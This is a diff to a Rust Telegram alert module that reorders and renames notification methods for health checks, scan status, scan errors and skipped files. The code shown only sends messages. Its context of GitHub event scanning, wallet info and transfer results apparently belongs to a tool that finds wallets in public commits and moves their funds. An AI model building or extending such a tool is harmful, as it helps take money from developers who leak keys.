@@ -35,7 +35,27 @@ impl TelegramAlerts {
         }
     }
     
-    // 🆕 Naya Method: Scan Status Report
+    // Health check
+    pub async fn send_health_check(&self) {
+        if self.chat_id.0 == 0 {
+            return;
+        }
+        
+        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
+        
+        let message = format!(
+            "💓 HEALTH CHECK\n\
+             ─────────────────────\n\
+             🕐 Time: {}\n\
+             ✅ Scanner is running\n\
+             🔄 Monitoring GitHub events...\n",
+            timestamp
+        );
+        
+        self.send_message(&message).await;
+    }
+    
+    // Scan status report
     pub async fn send_scan_status(
         &self,
         repo: &str,
@@ -46,7 +66,7 @@ impl TelegramAlerts {
         commit_sha: &str,
     ) {
         if self.chat_id.0 == 0 {
-            return; // Dummy mode
+            return;
         }
         
         let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
@@ -77,7 +97,7 @@ impl TelegramAlerts {
         self.send_message(&message).await;
     }
     
-    // 🆕 Naya Method: Scan Error Alert
+    // Scan error
     pub async fn send_scan_error(
         &self,
         repo: &str,
@@ -109,27 +129,7 @@ impl TelegramAlerts {
         self.send_message(&message).await;
     }
     
-    // 🆕 Naya Method: Health Check
-    pub async fn send_health_check(&self) {
-        if self.chat_id.0 == 0 {
-            return;
-        }
-        
-        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
-        
-        let message = format!(
-            "💓 HEALTH CHECK\n\
-             ─────────────────────\n\
-             🕐 Time: {}\n\
-             ✅ Scanner is running\n\
-             🔄 Monitoring GitHub events...\n",
-            timestamp
-        );
-        
-        self.send_message(&message).await;
-    }
-    
-    // 🆕 Naya Method: File Skip Warning
+    // File skipped
     pub async fn send_file_skipped(
         &self,
         repo: &str,
@@ -187,7 +187,7 @@ impl TelegramAlerts {
         self.send_message(&message).await;
     }
     
-    pub async fn send_transfer_success(&self, wallet_info: &WalletInfo, transfer: &TransferResult) {
+    pub async fn send_transfer_success(&self, _wallet_info: &WalletInfo, transfer: &TransferResult) {
         if self.chat_id.0 == 0 {
             return;
         }
